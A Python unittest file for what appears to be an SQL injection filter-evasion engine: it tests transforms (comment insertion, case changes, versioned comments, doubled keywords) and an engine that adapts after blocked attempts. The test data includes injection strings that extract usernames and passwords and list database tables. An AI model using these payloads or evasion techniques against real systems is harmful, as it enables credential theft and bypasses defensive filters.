from __future__ import annotations

import re
import unittest

from src.evasion import (
    EvasionEngine,
    LADDER,
    apply_pipeline,
    t_case,
    t_double_keyword,
    t_inline_comment,
    t_union_all,
    t_versioned_comment,
)

BASE = "1' UNION SELECT user,password FROM users-- -"


class TransformInvariants(unittest.TestCase):
    def test_inline_comment_only_touches_whitespace(self) -> None:
        out = t_inline_comment(BASE)
        self.assertIn("password", out)
        self.assertIn("user,password", out)
        self.assertNotIn("p/**/a", out)
        self.assertIn("UNION/**/SELECT", out)
        self.assertTrue(out.endswith("-- -"))

    def test_case_preserves_keywords_and_identifiers(self) -> None:
        out = t_case(BASE)
        self.assertRegex(out, r"(?i)union\s+select")
        self.assertIn("user,password", out)
        self.assertIn("users", out.lower())

    def test_union_all_inserts_all(self) -> None:
        self.assertIn("UNION ALL SELECT", t_union_all(BASE))

    def test_versioned_comment_wraps_keywords(self) -> None:
        out = t_versioned_comment(BASE)
        self.assertIn("/*!50000", out)
        self.assertIn("password", out)

    def test_double_keyword_nests(self) -> None:
        out = t_double_keyword("1 UNION SELECT a,b FROM t")
        self.assertIn("UNunionION", out)
        self.assertRegex(re.sub(r"(?i)union", "", out, count=1), r"(?i)^1 union ")

    def test_every_ladder_pipeline_is_applicable(self) -> None:
        for pipeline in LADDER:
            out = apply_pipeline(BASE, pipeline)
            self.assertIsInstance(out, str)
            self.assertTrue(len(out) > 0)


class EngineBehaviour(unittest.TestCase):
    def test_never_resends_same_bytes(self) -> None:
        eng = EvasionEngine()
        seen: set[str] = set()
        for _ in range(len(LADDER) + 5):
            payload, pipeline = eng.next_payload(BASE)
            if payload is None:
                break
            self.assertNotIn(payload, seen, "engine resent an identical payload")
            seen.add(payload)
            eng.record(pipeline, payload, blocked=True)
        self.assertGreaterEqual(len(seen), 5)
        self.assertEqual(eng.next_payload(BASE), (None, None))

    def test_first_pass_locks_pipeline(self) -> None:
        eng = EvasionEngine()
        p0, pipe0 = eng.next_payload(BASE)
        eng.record(pipe0, p0, blocked=True)
        p1, pipe1 = eng.next_payload(BASE)
        eng.record(pipe1, p1, blocked=False)
        self.assertEqual(eng.profile.locked_pipeline, pipe1)

    def test_locked_pipeline_reused_for_new_base(self) -> None:
        eng = EvasionEngine()
        p0, pipe0 = eng.next_payload(BASE)
        eng.record(pipe0, p0, blocked=False)
        new_base = "1' UNION SELECT table_name,1 FROM information_schema.tables-- -"
        payload, pipeline = eng.next_payload(new_base)
        self.assertEqual(pipeline, eng.profile.locked_pipeline)
        self.assertEqual(payload, apply_pipeline(new_base, eng.profile.locked_pipeline))

    def test_profile_summary_shape(self) -> None:
        eng = EvasionEngine()
        p, pipe = eng.next_payload(BASE)
        eng.record(pipe, p, blocked=True)
        s = eng.profile.summary()
        self.assertEqual(set(s), {"locked_pipeline", "blocked_count", "passed_count", "payloads_tried"})


if __name__ == "__main__":
    unittest.main()
